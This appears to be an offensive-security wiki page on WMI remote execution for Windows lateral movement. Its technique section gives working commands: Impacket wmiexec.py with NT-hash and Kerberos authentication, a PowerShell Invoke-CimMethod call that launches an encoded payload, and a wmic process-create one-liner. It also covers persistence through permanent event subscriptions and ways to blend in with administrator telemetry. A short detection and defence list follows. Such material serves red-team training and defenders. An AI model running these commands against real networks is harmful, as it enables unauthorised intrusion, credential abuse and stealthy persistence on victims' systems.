---
title: WMI exec
slug: wmi-exec
---

> **TL;DR:** Call `Win32_Process.Create` (or plant a permanent `__EventConsumer`) over DCOM/WMI to spawn a process on a remote host without dropping a service binary or touching `\PIPE\svcctl` — fileless lateral exec.

## What it is
WMI is the management bus baked into Windows; remote WMI rides DCOM (135 + dynamic high port). Invoking the static method `Win32_Process::Create` on a remote namespace starts a process under the authenticated user without service create, scheduled task, or named-pipe shell. Output is not returned, so operators read it back from an admin share or push it to a known location. The permanent-event-subscription variant (`__EventFilter` + `CommandLineEventConsumer` + `__FilterToConsumerBinding`) is also a persistence technique — closely related to [[dcom-exec]] in transport.

## Preconditions / where it applies
- Local administrator on the target (default WMI namespace ACLs require it).
- 135/tcp + RPC dynamic port range reachable.
- DCOM not firewall-blocked; WMI service (`Winmgmt`) running.
- Credentials: password, NT hash, or Kerberos ticket.

## Technique
Impacket `wmiexec.py` — semi-interactive shell, output via `ADMIN$\__1234.<rand>`:

```
wmiexec.py -hashes :<NThash> corp/admin@10.0.0.5
wmiexec.py -k -no-pass corp.local/admin@fs01    # kerberos
wmiexec.py -shell-type powershell corp/admin:'P@ss'@srv01
```

PowerShell-native (no third-party tools, blends with admin telemetry):

```powershell
$o = New-CimSession -ComputerName srv01 -Credential (Get-Credential)
Invoke-CimMethod -CimSession $o -ClassName Win32_Process -MethodName Create `
    -Arguments @{ CommandLine = 'powershell -nop -enc <b64>' }
```

For fully fileless output capture, combine with a SMB-less channel (write to `HKLM:\SOFTWARE\...` and read back via a second WMI query of `StdRegProv`). Permanent-event subscription (`mofcomp evil.mof`) executes when the chosen filter fires (logon, time, process create) — quieter than interactive.

The legacy `wmic` one-liner — `wmic /node:10.0.0.6 /user:administrator /password:<pw> process call create "cmd.exe /c calc"` — is still useful on older hosts and AppLocker-constrained shells where `wmic.exe` is whitelisted but PowerShell is not. It generates a 4648 explicit-logon on the source plus 4624 + 4648 on the target, so plan source-side telemetry accordingly; Microsoft has deprecated `wmic.exe` from Windows 11 23H2 onward, so on modern fleets fall back to `Invoke-CimMethod` over WSMan instead of DCOM.

## Detection and defence
- Sysmon EID 19/20/21 (WMI activity) capture filter/consumer/binding creation — the highest-signal WMI hunt.
- 4688 / Sysmon EID 1 with parent `WmiPrvSE.exe` spawning `cmd.exe` / `powershell.exe` — `wmiexec` signature.
- 5857–5861 (Microsoft-Windows-WMI-Activity) for remote operations on `Win32_Process`.
- Defences: scope DCOM/WMI to management subnets, enable WMI tracing, restrict `Remote Management Users`, alert on `WmiPrvSE.exe` children that are shells.

## References
- [Impacket wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) — protocol + output-channel mechanics.
- [WMI as an attack vector — Mandiant](https://www.mandiant.com/resources/blog/windows-management-instrumentation-wmi-offense-defense-and-forensics) — canonical research paper.
- [WMI lateral movement — HackTricks](https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/wmiexec.html) — variants and detections.
- [ired.team — WMI for lateral movement](https://www.ired.team/offensive-security/lateral-movement/t1047-wmi-for-lateral-movement) — `wmic /node` syntax and 4648/4624 event chain.
